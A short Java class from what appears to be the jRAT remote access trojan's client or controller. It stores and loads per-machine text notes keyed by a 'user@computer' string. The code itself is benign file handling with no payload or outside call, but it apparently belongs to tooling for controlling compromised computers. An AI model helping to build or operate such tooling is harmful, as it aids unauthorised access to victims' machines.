package io.jrat.client;

import io.jrat.client.io.Files;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileWriter;
import java.io.InputStreamReader;


public class Notes {

	public static final File path = new File(Files.getFiles(), "notes");

	public static String load(String userAtComp) throws Exception {
		File file = new File(path, userAtComp.replace("@", "-") + ".txt");

		if (!file.exists()) {
			throw new Exception();
		}

		FileInputStream in = new FileInputStream(file);

		BufferedReader reader = new BufferedReader(new InputStreamReader(in));

		String line;
		String s = "";

		while ((line = reader.readLine()) != null) {
			s += line + "\n\r";
		}

		reader.close();

		return s;
	}

	public static void save(String note, String userAtComp) throws Exception {
		path.mkdirs();
		File file = new File(path, userAtComp.replace("@", "-") + ".txt");

		FileWriter writer = new FileWriter(file);
		writer.write(note);
		writer.close();
	}
}
